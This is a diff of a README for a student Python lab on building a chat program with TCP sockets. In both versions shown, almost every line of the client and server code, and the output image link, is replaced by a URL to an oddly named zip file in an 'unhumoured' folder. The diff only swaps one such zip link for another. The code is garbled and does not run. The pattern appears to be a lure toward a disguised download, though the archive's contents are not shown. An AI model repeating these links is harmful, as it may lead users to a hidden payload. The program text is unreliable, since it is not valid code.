@@ -1,4 +1,4 @@
-# https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip FOR CHAT USING TCP SOCKETS
+# https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip FOR CHAT USING TCP SOCKETS
 ## NAME :YUGABHARATHI M
 ## REGISTER NUMBER : 212224230314
 ## AIM
@@ -11,30 +11,30 @@ To write a python program for creating Chat using TCP Sockets Links.
 4. Send and receive the message using the send function in socket.
 ## PROGRAM
 ~~~
-https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip
+https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip
 import socket 
-https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip() 
-https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip(('localhost',8000)) 
+https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip() 
+https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip(('localhost',8000)) 
 while True: 
     msg=input("Client > ") 
-    https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip(https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip()) 
-    print("Server > ",https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip(1024).decode())
+    https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip(https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip()) 
+    print("Server > ",https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip(1024).decode())
 ~~~
 ~~~
-https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip
+https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip
 import socket 
-https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip() 
-https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip(('localhost',8000)) 
-https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip(5) 
-c,https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip() 
+https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip() 
+https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip(('localhost',8000)) 
+https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip(5) 
+c,https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip() 
 while True: 
-            https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip(1024).decode() 
+            https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip(1024).decode() 
             print("Client > ",ClientMessage) 
             msg=input("Server > ") 
-            https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip(https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip())
+            https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip(https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip())
 ~~~
 ## OUPUT
-![image](https://raw.githubusercontent.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/main/unhumoured/TC_USIN_CHA_b_SOCKETS_v3.6-beta.3.zip)
+![image](https://github.com/Yugabharathi91/3b_CHAT_USING_TCP_SOCKETS/raw/refs/heads/main/unhumoured/SOCKETS-b-CHA-TC-USIN-v3.8.zip)
 
 
 ## RESULT
